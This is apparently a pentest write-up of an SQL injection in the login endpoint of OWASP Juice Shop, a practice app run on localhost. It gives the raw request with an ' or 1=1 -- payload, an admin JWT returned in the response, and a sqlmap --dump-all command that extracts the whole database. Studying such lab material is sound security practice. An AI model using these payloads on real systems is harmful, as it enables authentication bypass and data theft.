## Description

Returns JSON containing contents of a user basket 

## Connection Details

HTTP Methods: `POST`
Parameters: 
- `email`
- `password`

## Parameters 

### `email`
#### Description
OR boolean-based blind - WHERE or HAVING clause' injectable 

### `password`
#### Description
Self explanatory

## Vulnerabilities

### SQLi in `email` field

#### Exploit
Request
```http
POST /rest/user/login HTTP/1.1
Host: localhost:3000
Content-Type: application/json
Content-Length: 55

{"email":"' or 1=1 --","password":"qwert"}
```
Response 
```http 
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 822
ETag: W/"336-FuaJhU3g6dd3ZPE4ZQraZod1kNs"
Vary: Accept-Encoding
Date: Tue, 20 Dec 2022 09:24:27 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjItMTItMjAgMDQ6NTM6MzAuNzc0ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjItMTItMjAgMDQ6NTM6MzAuNzc0ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY3MTUyODI2NywiZXhwIjoxNjcxNTQ2MjY3fQ.P-X1Q9VfUEqNNIUKfhlJuCsR5_rUMWhm2ijMA_fZu7WWwK8kg-2oXVHThLxqLOtoA_TqkIXfTQ0IeFkW8GuGLGwI3_SU9-8a5aAuFwFj-RrVTo3gD_9SF3H5jl9bdG9uvA2NnePtcHf4AR0aWvq0Hk2GzgvS7IQFTxnK_RpoM-Y","bid":1,"umail":"admin@juice-sh.op"}}
```
#### Impact
Able to log in as any user. 

#### Extracting all database information
##### Payload
```bash
python sqlmap.py -r ../../Desktop/test-juice/loginsqli.req --code 200 --ignore-code 401 --level 5 --risk 3 --dump-all
```


## Possible Attack Vectors

### ?


